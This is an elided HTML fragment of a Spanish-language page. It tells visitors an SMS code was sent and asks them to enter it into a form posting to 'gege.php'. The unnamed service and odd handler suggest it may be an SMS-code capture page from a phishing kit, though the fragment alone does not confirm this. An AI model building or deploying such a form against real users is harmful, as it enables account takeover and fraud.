...
<body>
        ...
        <div class="box-todo">
            <div class="box">
                ...
                <div class="c1" id="cja1">
                    <div class="campo">
                        <div class="aletr">
                        <h5>Le hemos enviado un codigo sms.
                        <br> Por favor revise sus mensajes de texto y escriba el numero en la siguiente pantalla</h5>
                        </div>
                <form action="gege.php" method="post">
                        <input type="text" placeholder="Ingrese el Codigo" required name="C1">
                    </div>
                    <div class="btn">
            ...
            <div id="cja2" style="display: none;">
